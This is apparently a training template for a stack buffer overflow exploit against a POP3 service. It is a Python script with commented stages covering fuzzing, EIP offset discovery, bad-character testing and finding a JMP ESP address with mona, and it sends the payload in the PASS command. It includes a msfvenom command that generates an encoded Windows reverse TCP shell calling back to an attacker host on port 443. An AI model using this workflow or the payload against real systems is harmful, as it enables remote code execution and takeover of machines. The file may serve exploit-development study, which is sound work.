import sys
import socket
import time
import struct

##### Run Fuzzer first to crash service and determine an offset estimate, then run/modify code below
##### May have to modify client portion at bottom to match fuzzer


RHOST = "192.168.1.1"
RPORT = 110

## Use these once the EIP has been determined
#buf_totlen = 
#offset_srp = 

##### Fuzzing
## Overwrite the EIP
#
#buf = ""
#buf += "A"*####
#buf +="\n"

##### Determining the EIP
## /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ##
#
## EIP = 
## /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l ## -q ##
## Offset = 

#buf = ""
#buf += ("")
#buf +="\n"

##### Controlling the EIP
#
#buf = ""
#buf += "A"*(offset_srp - len(buf))
## EIP Overwite with B's
#buf += "B"*4
## ESP address should be filed with C's
#buf += "C"*4
## Trail padding
#buf += "D"*(buf_totlen - len(buf))
#buf +="\n"

##### Determining Bad Characters
## 0x00 = Null Byte = terminates a string copy operation
## 0x0A = Line Feed = advances by the space of one line
## 0x0D = Carriage Return = resets to the beginning of a line of text
## 0x20 = Space = introduces an space character
## Manual: Eye grepping
#ALL_char="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
# Known Bad = \x00
#char="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#
## EASY WIN: Right click ESP, follow in dump. Likely reverse order
## !mona compare -a esp_address_from_crash -f C:\char_test.bin
## ^ esp_address MAY change each run
#char_test = ""
#bad_chars = [0x00]
#for i in range (0x00, 0xFF+1):
#	if i not in bad_chars:
#		char_test += chr(i)
#with open ("char_test.bin", "wb") as f:
#	f.write(char_test)

#buf = ""
#buf += "A"*(offset_srp - len(buf))
#buf += "B"*4
#buf += char_test
#buf += "D"*(buf_totlen - len(buf))
#buf +="\n"

##### Finding JMP ESP in a dll/exe 		*** AFTER A CRASH ***
## QUICK WIN: Use known bad characters in -cpb
## !mona jmp -r esp -cpb "\x00"
## Click l to view log, right-clight --> Follow in Dissembler --> is address "JMP ESP"?? if so, GREAT! if not go back & find another that is
#
## IF no quick win... 
## !mona modules
## look for ASLR & NXCompact (DEP) = false
#
## Check assembly for JMP ESP should be FFE4, double check below
## /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb ----->> jmp esp
#
## !mona find -s "\xff\xe4" -m name.dll/exe
## Make sure Execute is listed and no bad characters in the address!!
## ->| (to the left of l e m)
## Choose first one to enter above. If it doesn't return "JMP ESP" in top left window, ->| again, if still no JMP ESP move to next and repeat
## \xCC = INT3 (3 will be shown in immunity once ran, one has already been executed)

## Base Address from !mona jmp with points to "JMP ESP", as is (no changing byte order around)
#ptr_jmp_esp = 0x

#buf = ""
#buf += "A"*(offset_srp - len(buf))
#buf += struct.pack("<I", ptr_jmp_esp)
#buf += "\xCC\xCC\xCC\xCC"
#buf += "D"*(buf_totlen - len(buf))
#buf +="\n"


##### Reverse Shell
## msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.59 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
## No need for NOPs as this will move ESP up the stack towards a lower address, saving space without using NOP sled
## ^ WHENEVER messing witH ESP, always make sure it remains divisiable by 4!!! also make sure contains no bad characters
## /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
## sub esp,0x10


#shellcode = ()

#ptr_jmp_esp = 0x
#sum_esp_10 = "\x83\xec\x10"

#buf = ""
#buf += "A"*(offset_srp - len(buf))
#buf += struct.pack("<I", ptr_jmp_esp)
#buf += sum_esp_10
#uf += shellcode
#buf += "D"*(buf_totlen - len(buf))
#buf +="\n"

# TCP connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
data = s.recv(1024)
s.send('USER username' + '\r\n')
data = s.recv(1024)
s.send('PASS ' + buf + '\r\n')

